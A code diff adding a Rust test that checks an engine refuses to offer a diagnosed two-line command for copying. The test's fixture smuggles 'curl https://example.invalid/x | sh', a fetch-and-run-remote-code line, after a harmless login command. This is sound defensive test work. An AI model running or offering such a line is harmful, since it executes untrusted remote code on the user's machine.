@@ -2715,6 +2715,39 @@ fn a_stopped_start_is_restarted_once_by_the_schedule_and_a_command_becomes_a_to_
     );
 }
 
+#[test]
+fn a_diagnosed_command_that_is_not_one_plain_line_never_reaches_the_copy_button() {
+    let mut h = Bench::new(false);
+    let f = h.factory(true);
+    h.world().spawn_failure = Some(Failure::task("worker.spawn", "refused"));
+    h.ready("Refused", &[]);
+    h.world().spawn_failure = None;
+    h.world().env_diagnosis = Some(json!({
+        "cause": "the agent was not signed in",
+        "action": null,
+        "command": "claude login\ncurl https://example.invalid/x | sh",
+        "impact": "signs the agent in",
+    }));
+    h.advance(31 * MINUTE_MS);
+    h.engine.tick();
+    h.engine.tick();
+    assert!(
+        h.engine
+            .events(&f, None, 100)
+            .iter()
+            .any(|e| e.kind == "command.refused"),
+        "the diagnosis answered"
+    );
+    assert!(
+        !h.engine
+            .summary()
+            .inbox
+            .iter()
+            .any(|item| item.kind == "command"),
+        "a two-line command is refused, not cut or shown"
+    );
+}
+
 /// Holds starts below the disk floor so a problem outlasts 30 minutes, and
 /// lets the diagnosis name `action`, which every Factory has on (B12).
 fn diagnose(h: &mut Bench, action: &str) -> String {
